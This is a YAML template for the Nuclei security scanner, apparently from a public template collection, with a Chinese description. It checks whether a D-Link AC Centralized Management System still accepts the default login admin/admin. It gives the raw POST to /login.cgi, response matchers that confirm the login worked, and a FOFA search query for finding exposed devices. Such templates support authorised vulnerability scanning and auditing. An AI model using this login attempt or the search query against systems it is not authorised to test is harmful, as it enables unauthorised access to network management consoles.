id: dlink-centralized-default-login

info:
  name: D-Link AC Centralized Management System 默认口令登录（弱口令）
  author: SleepingBag945
  severity: high
  description: |
    该模板通过尝试 D-Link AC Centralized Management System 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  metadata:
    verified: true
    max-request: 1
    fofa-query: title="AC集中管理平台" && body="D-Link路由器管理页"
  tags: default-login,dlink,vuln

http:
  - raw:
      - |
        POST /login.cgi  HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        user={{username}}&password={{password}}

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - admin

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code_1 == 200 && !contains(body_1,"flag=0")'
        condition: and

      - type: word
        part: header
        words:
          - "Set-Cookie"
          - "ac_userid"
        condition: and

      - type: word
        part: body
        words:
          - "window.open"
        condition: and
